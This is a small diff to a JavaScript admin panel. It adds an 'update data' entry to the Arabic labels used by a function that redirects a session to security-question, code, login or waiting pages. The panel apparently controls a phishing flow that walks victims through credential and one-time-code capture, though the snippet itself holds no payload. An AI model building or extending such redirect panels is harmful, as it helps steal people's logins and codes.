@@ -554,7 +554,7 @@ function sendSecQ(id){
 
 function doRedir(id,page){
   api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
-    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار'};
+    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار','update-data':'تحديث البيانات'};
     showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
 }
 
